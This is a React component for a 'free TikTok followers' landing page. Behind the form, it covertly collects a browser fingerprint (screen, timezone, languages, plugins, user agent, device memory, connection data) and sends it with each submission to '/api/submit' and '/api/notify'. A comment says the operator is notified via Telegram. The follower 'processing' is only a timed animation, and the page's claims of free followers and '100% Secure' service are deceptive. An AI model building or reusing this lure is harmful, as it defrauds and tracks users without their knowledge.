import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { insertSubmissionSchema } from "@shared/schema";
import { z } from "zod";
import { 
  Form, 
  FormControl, 
  FormField, 
  FormItem, 
  FormLabel, 
  FormMessage 
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import Countdown from "@/components/Countdown";
import ProcessingAnimation from "@/components/ProcessingAnimation";
import SuccessMessage from "@/components/SuccessMessage";
import { Loader2, Sparkles, ShieldCheck, Lock, CheckCircle, Flame, TrendingUp } from "lucide-react";

// Extend schema for frontend validation
const formSchema = insertSubmissionSchema.extend({
  username: z.string()
    .min(3, "Username must be at least 3 characters long")
    .max(30, "Username must be less than 30 characters")
    .regex(/^[a-zA-Z0-9._]+$/, "Username can only contain letters, numbers, period and underscore"),
});

type FormValues = z.infer<typeof formSchema>;

export default function FollowerForm() {
  const [formStep, setFormStep] = useState<'form' | 'processing' | 'success'>('form');
  const [selectedAmount, setSelectedAmount] = useState<number>(5000);
  const { toast } = useToast();
  const [userInfo, setUserInfo] = useState({
    screenSize: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    language: navigator.language,
    languages: Array.from(navigator.languages || []).join(','),
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    deviceMemory: (navigator as any).deviceMemory || 'unknown',
    hardwareConcurrency: navigator.hardwareConcurrency,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || (window as any).doNotTrack || 'unknown',
    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(','),
    ip: '',
    connection: (navigator as any).connection ? {
      downlink: (navigator as any).connection.downlink,
      effectiveType: (navigator as any).connection.effectiveType,
      rtt: (navigator as any).connection.rtt,
      saveData: (navigator as any).connection.saveData
    } : 'unknown'
  });
  
  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      username: "",
      followersRequested: 5000,
      email: "",
    },
    mode: "onChange",
  });
  
  const mutation = useMutation({
    mutationFn: async (values: FormValues) => {
      // Combine form values with user info
      const payload = {
        ...values,
        userInfo: userInfo
      };
      const data = await apiRequest("POST", "/api/submit", payload);
      return data.json();
    },
    onSuccess: (data) => {
      setFormStep('processing');
      
      // Send notification to Telegram (this would be implemented on the server-side)
      fetch("/api/notify", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: form.getValues("username"),
          followers: selectedAmount,
          userInfo: userInfo
        })
      }).catch(err => console.error("Notification error", err));
      
      // Simulate processing for demonstration purposes
      setTimeout(() => {
        setFormStep('success');
        
        // Redirect to thank you page after a short delay
        setTimeout(() => {
          window.location.href = `/thank-you/${data.submission.id}`;
        }, 2000);
      }, 3000);
    },
    onError: (error) => {
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to submit your request",
        variant: "destructive",
      });
    },
  });
  
  const onSubmit = (values: FormValues) => {
    // Set the number of followers based on the selected amount
    values.followersRequested = selectedAmount;
    mutation.mutate(values);
  };
  
  const selectFollowerAmount = (amount: number) => {
    setSelectedAmount(amount);
    form.setValue("followersRequested", amount);
  };
  
  return (
    <section id="boost-now" className="py-16 px-4 md:px-8 bg-black text-white">
      <div className="max-w-4xl mx-auto">
        <div className="text-center mb-12">
          <div className="inline-block mb-3 px-4 py-1 bg-[#1D1D1D] rounded-full text-sm font-medium">
            <span className="text-[#25F4EE]">LIMITED OFFER</span> - <Countdown /> LEFT
          </div>
          <h2 className="text-3xl md:text-5xl font-montserrat font-bold mb-4">
            Get Your Free TikTok Followers Now
          </h2>
          <p className="text-lg text-gray-300 max-w-2xl mx-auto">
            Enter your TikTok username below to receive up to 1,000 free followers. No password required!
          </p>
        </div>
        
        <div className="bg-[#1D1D1D] rounded-2xl p-8 md:p-10 shadow-lg max-w-2xl mx-auto">
          {formStep === 'form' && (
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <FormField
                  control={form.control}
                  name="username"
                  render={({ field }) => (
                    <FormItem className="space-y-2">
                      <FormLabel className="block font-medium text-gray-200">TikTok Username</FormLabel>
                      <div className="relative">
                        <span className="absolute inset-y-0 left-0 pl-3 flex items-center text-gray-400">@</span>
                        <FormControl>
                          <Input
                            placeholder="your_tiktok_username"
                            className="w-full bg-black border border-gray-700 rounded-lg py-6 pl-8 pr-3 text-white placeholder:text-gray-500 focus:outline-none focus:ring-2 focus:ring-[#25F4EE]"
                            {...field}
                          />
                        </FormControl>
                      </div>
                      <FormMessage className="text-[#FE2C55] text-sm" />
                    </FormItem>
                  )}
                />
                
                <div className="space-y-2">
                  <FormLabel className="block font-medium text-gray-200">Number of Followers</FormLabel>
                  <div className="grid grid-cols-3 gap-3">
                    <Button
                      type="button"
                      variant="outline"
                      onClick={() => selectFollowerAmount(250)}
                      className={`
                        bg-black border ${selectedAmount === 250 ? 'border-[#25F4EE]' : 'border-gray-700 hover:border-[#25F4EE]'} 
                        rounded-lg py-6 text-center transition
                      `}
                    >
                      250
                    </Button>
                    <Button
                      type="button"
                      variant="outline"
                      onClick={() => selectFollowerAmount(500)}
                      className={`
                        bg-black border ${selectedAmount === 500 ? 'border-[#25F4EE]' : 'border-gray-700 hover:border-[#25F4EE]'} 
                        rounded-lg py-6 text-center transition
                      `}
                    >
                      500
                    </Button>
                    <Button
                      type="button"
                      variant="outline"
                      onClick={() => selectFollowerAmount(1000)}
                      className={`
                        bg-black border ${selectedAmount === 1000 ? 'border-[#25F4EE]' : 'border-gray-700 hover:border-[#25F4EE]'} 
                        rounded-lg py-6 text-center transition
                      `}
                    >
                      1000
                    </Button>
                  </div>
                </div>
                
                <Button 
                  type="submit" 
                  className="w-full tiktok-btn-gradient text-white font-semibold py-6 px-6 rounded-lg transition transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#FE2C55]"
                  disabled={mutation.isPending}
                >
                  {mutation.isPending ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    "Get Free Followers"
                  )}
                </Button>
              </form>
            </Form>
          )}
          
          {formStep === 'processing' && <ProcessingAnimation />}
          
          {formStep === 'success' && (
            <SuccessMessage 
              username={form.getValues("username")} 
              followers={selectedAmount.toString()} 
            />
          )}
        </div>
        
        <div className="mt-10 text-center">
          <p className="text-sm text-gray-400">
            By using our service, you agree to our Terms of Service and Privacy Policy.
          </p>
          <div className="flex flex-wrap justify-center gap-4 md:gap-6 mt-4">
            <div className="flex items-center text-gray-400 text-sm">
              <Lock className="mr-2 h-4 w-4" /> 100% Secure
            </div>
            <div className="flex items-center text-gray-400 text-sm">
              <ShieldCheck className="mr-2 h-4 w-4" /> No Password Required
            </div>
            <div className="flex items-center text-gray-400 text-sm">
              <CheckCircle className="mr-2 h-4 w-4" /> Instant Processing
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}
